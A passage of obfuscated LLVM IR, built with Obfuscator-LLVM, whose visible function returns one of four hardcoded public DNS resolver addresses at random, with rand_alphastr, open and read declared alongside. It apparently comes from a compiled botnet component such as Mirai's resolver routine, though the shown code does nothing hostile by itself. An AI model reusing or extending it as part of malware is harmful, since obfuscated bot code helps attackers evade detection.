  %.2 = phi i8 [ %.1, %28 ], [ 0, %21 ], [ 0, %21 ], [ %.1, %25 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %36 = icmp slt i64 %indvars.iv.next, %16
  br i1 %36, label %17, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %35
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %6, %0
  %37 = call i32 @rand_next() #7
  %trunc = trunc i32 %37 to i2
  switch i2 %trunc, label %46 [
    i2 0, label %38
    i2 1, label %40
    i2 -2, label %42
    i2 -1, label %44
  ]

; <label>:38:                                     ; preds = %.loopexit
  %39 = call i32 @htonl(i32 134744072) #8
  br label %47

; <label>:40:                                     ; preds = %.loopexit
  %41 = call i32 @htonl(i32 1246898730) #8
  br label %47

; <label>:42:                                     ; preds = %.loopexit
  %43 = call i32 @htonl(i32 1074151430) #8
  br label %47

; <label>:44:                                     ; preds = %.loopexit
  %45 = call i32 @htonl(i32 67240450) #8
  br label %47

; <label>:46:                                     ; preds = %.loopexit
  unreachable

; <label>:47:                                     ; preds = %44, %42, %40, %38, %.critedge
  %.0 = phi i32 [ %34, %.critedge ], [ %45, %44 ], [ %43, %42 ], [ %41, %40 ], [ %39, %38 ]
  ret i32 %.0
}

declare i32 @rand_alphastr(...) local_unnamed_addr #3

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #3

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind }
attributes #8 = { nounwind readnone }
attributes #9 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846634}
!2 = !{i32 -2146846225}
